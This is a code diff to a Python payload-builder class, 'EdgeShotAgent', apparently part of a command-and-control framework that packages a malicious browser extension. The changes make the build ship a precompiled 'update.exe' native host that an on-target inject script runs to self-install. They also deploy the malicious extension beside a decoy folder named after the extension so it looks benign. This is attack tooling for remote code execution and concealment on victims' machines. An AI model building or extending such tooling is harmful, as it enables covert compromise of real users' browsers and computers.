@@ -314,10 +314,11 @@ class EdgeShotAgent(PayloadType):
             zout.writestr(f"{prefix}/icons/{name}", data)
 
     def _add_rce_source(self, zout) -> None:
-        """Bundle the RCE native-host SOURCE (native-host.c + README) at the ZIP
-        root. It is not compiled here (no Windows cross-compiler in the build
-        container) and is not part of the extension payload — the operator
-        compiles update.exe locally and drops it with execute_file."""
+        """Bundle everything under agent_code/rce/ (native-host.c, README, and a
+        precompiled update.exe if one is present) at the ZIP root under rce/.
+        The source is not compiled here (no Windows cross-compiler in the build
+        container); a committed update.exe is shipped as-is and the on-target
+        inject script runs it directly to self-install the native host."""
         rce_dir = self.agent_code_path / "rce"
         if not rce_dir.exists():
             return
@@ -657,7 +658,10 @@ class EdgeShotAgent(PayloadType):
 
         target_dir = target_dir or self._default_target_dir(platform)
         malicious_name = crx_id
-        benign_name = "GoogleDocsOffline"
+        # The decoy folder on disk is named after the operator's extension
+        # (ADDONNAME, already substituted into the manifest) rather than a
+        # hardcoded "GoogleDocsOffline" string.
+        benign_name = manifest_dict.get("name") or "EdgeShot"
 
         deploy_path_a = _path_join(platform, target_dir, malicious_name)
         deploy_path_b = _path_join(platform, target_dir, benign_name)
